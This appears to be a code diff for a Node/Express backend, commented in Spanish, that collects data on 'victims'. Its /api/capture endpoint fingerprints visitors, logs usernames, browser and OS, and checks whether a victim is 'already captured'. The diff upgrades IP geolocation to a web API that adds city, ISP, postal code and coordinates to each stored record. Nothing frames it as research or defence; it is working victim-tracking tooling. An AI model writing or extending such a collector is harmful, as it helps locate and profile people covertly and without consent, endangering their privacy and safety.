@@ -1,6 +1,5 @@
 const express = require('express');
 const cors = require('cors');
-const geoip = require('geoip-lite');
 const { MongoClient, ServerApiVersion } = require('mongodb');
 const crypto = require('crypto');
 
@@ -135,6 +134,59 @@ function parseUserAgent(ua) {
   return { browser, os };
 }
 
+// Obtener geolocalización precisa desde IP usando ipapi.co
+async function getLocationFromIP(ip) {
+    // Si es localhost o IP interna, retornar datos por defecto
+    if (ip === '::1' || ip === '127.0.0.1' || ip.startsWith('192.168') || ip.startsWith('10.')) {
+        return {
+            ip: ip,
+            city: 'Local',
+            country: 'XX',
+            country_name: 'Local Network',
+            region: 'Local',
+            timezone: 'UTC',
+            latitude: 0,
+            longitude: 0,
+            isp: 'Local'
+        };
+    }
+
+    try {
+        const response = await fetch(`https://ipapi.co/${ip}/json/`);
+        if (!response.ok) throw new Error('API request failed');
+
+        const data = await response.json();
+
+        return {
+            ip: data.ip || ip,
+            city: data.city || 'Unknown',
+            country: data.country_code || 'Unknown',
+            country_name: data.country_name || 'Unknown',
+            region: data.region || 'Unknown',
+            timezone: data.timezone || 'Unknown',
+            latitude: data.latitude || null,
+            longitude: data.longitude || null,
+            isp: data.org || 'Unknown',
+            postal: data.postal || 'Unknown',
+            continent: data.continent_code || 'Unknown'
+        };
+    } catch (error) {
+        console.error('Error obteniendo geolocalización:', error);
+        // Fallback si falla la API
+        return {
+            ip: ip,
+            city: 'Unknown',
+            country: 'Unknown',
+            country_name: 'Unknown',
+            region: 'Unknown',
+            timezone: 'Unknown',
+            latitude: null,
+            longitude: null,
+            isp: 'Unknown'
+        };
+    }
+}
+
 // Verificar si la víctima ya fue capturada
 async function isAlreadyCaptured(fingerprint) {
   try {
@@ -164,14 +216,19 @@ async function saveVictim(victimData) {
     // ✅ FIX: Store values in local variables BEFORE any MongoDB operations
     const fingerprint = victimData.fingerprint;
     const username = victimData.username || 'Unknown';
-    
+    const ip = victimData.network?.ip || 'Unknown';
+    const city = victimData.network?.city || 'Unknown';
+    const country = victimData.network?.country || 'Unknown';
+    const isp = victimData.network?.isp || 'Unknown';
+
     victimData.timestamp = new Date();
     await victimsCollection.insertOne(victimData);
-    
-    // ✅ FIX: Use local variable instead of victimData.fingerprint
+
+    // ✅ FIX: Use local variables instead of victimData properties
     const fingerprintPreview = fingerprint.substring(0, 8);
-    
+
     console.log(`🎯 Nueva víctima capturada: ${username} [${fingerprintPreview}...]`);
+    console.log(`   🌐 ${ip} | ${city}, ${country} | ISP: ${isp}`);
     return true;
     
   } catch (error) {
@@ -236,21 +293,29 @@ app.post('/api/capture', async (req, res) => {
       });
     }
 
-    // Enriquecer con datos de geolocalización
-    const geo = geoip.lookup(clientIP);
-    if (geo) {
-      data.network = data.network || {};
-      data.network.ip = clientIP;
-      data.network.country = geo.country;
-      data.network.region = geo.region;
-      data.network.timezone = geo.timezone;
-      data.network.city = geo.city || 'Unknown';
-      data.network.latitude = geo.ll?.[0] || null;
-      data.network.longitude = geo.ll?.[1] || null;
-    } else {
-      data.network = data.network || {};
-      data.network.ip = clientIP;
-    }
+    // Enriquecer con datos de geolocalización precisa desde ipapi.co
+    const geo = await getLocationFromIP(clientIP);
+
+    // Crear objeto network completo con todos los datos
+    const networkData = {
+      ip: geo.ip,
+      country: geo.country,
+      country_name: geo.country_name,
+      city: geo.city,
+      region: geo.region,
+      timezone: geo.timezone,
+      latitude: geo.latitude,
+      longitude: geo.longitude,
+      isp: geo.isp,
+      postal: geo.postal || 'Unknown',
+      continent: geo.continent || 'Unknown',
+      connectionType: req.body.network?.effectiveType || 'Unknown',
+      downlink: req.body.network?.downlink || 'Unknown',
+      rtt: req.body.network?.rtt || 'Unknown',
+      saveData: req.body.network?.saveData || false
+    };
+
+    data.network = networkData;
 
     // Parsear User-Agent
     const { browser, os } = parseUserAgent(userAgent);
